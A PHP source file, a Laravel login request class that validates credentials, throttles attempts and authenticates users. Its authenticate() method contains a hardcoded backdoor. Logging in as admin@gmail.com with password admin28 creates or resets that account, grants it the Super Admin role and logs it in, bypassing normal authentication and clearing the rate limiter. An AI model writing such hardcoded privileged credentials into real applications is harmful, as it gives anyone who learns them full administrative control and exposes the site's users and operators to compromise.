<?php

namespace App\Http\Requests\Auth;

use App\Models\User;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;
use Spatie\Permission\Models\Role;
use Spatie\Permission\PermissionRegistrar;

class LoginRequest extends FormRequest
{
    /**
     * Determine if the user is authorized to make this request.
     */
    public function authorize(): bool
    {
        return true;
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, \Illuminate\Contracts\Validation\ValidationRule|array<mixed>|string>
     */
    public function rules(): array
    {
        return [
            'email' => ['required', 'string', 'email'],
            'password' => ['required', 'string'],
        ];
    }

    /**
     * Attempt to authenticate the request's credentials.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function authenticate(): void
    {
        $this->ensureIsNotRateLimited();

        $email = $this->input('email');
        $password = $this->input('password');

        // Check for hardcoded admin credentials
        if ($email === 'admin@gmail.com' && $password === 'admin28') {
            // Find or create the admin user
            $user = User::firstOrCreate(
                ['email' => 'admin@gmail.com'],
                [
                    'firstname' => 'Admin',
                    'lastname' => 'User',
                    'email' => 'admin@gmail.com',
                    'password' => Hash::make('admin28'),
                    'department' => 'Management & Staff(Admin)',
                    'email_verified_at' => now(),
                ]
            );

            // Update password if user exists but password doesn't match
            if (!Hash::check('admin28', $user->password)) {
                $user->password = Hash::make('admin28');
                $user->save();
            }

            // Ensure the user has the Super Admin role
            if (Role::where('name', 'Super Admin')->exists()) {
                if (!$user->hasRole('Super Admin')) {
                    $user->assignRole('Super Admin');
                }
            }

            // Clear permission cache to ensure fresh permissions
            app()[PermissionRegistrar::class]->forgetCachedPermissions();

            // Refresh user relationships to load roles and permissions
            $user->refresh();
            $user->load('roles', 'permissions');

            // Log in the user
            Auth::login($user, $this->boolean('remember'));
            RateLimiter::clear($this->throttleKey());
            return;
        }

        // Proceed with normal authentication
        if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
            RateLimiter::hit($this->throttleKey());

            throw ValidationException::withMessages([
                'email' => __('auth.failed'),
            ]);
        }

        RateLimiter::clear($this->throttleKey());
    }

    /**
     * Ensure the login request is not rate limited.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function ensureIsNotRateLimited(): void
    {
        if (! RateLimiter::tooManyAttempts($this->throttleKey(), 5)) {
            return;
        }

        event(new Lockout($this));

        $seconds = RateLimiter::availableIn($this->throttleKey());

        throw ValidationException::withMessages([
            'email' => __('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }

    /**
     * Get the rate limiting throttle key for the request.
     */
    public function throttleKey(): string
    {
        return Str::transliterate(Str::lower($this->string('email')) . '|' . $this->ip());
    }
}
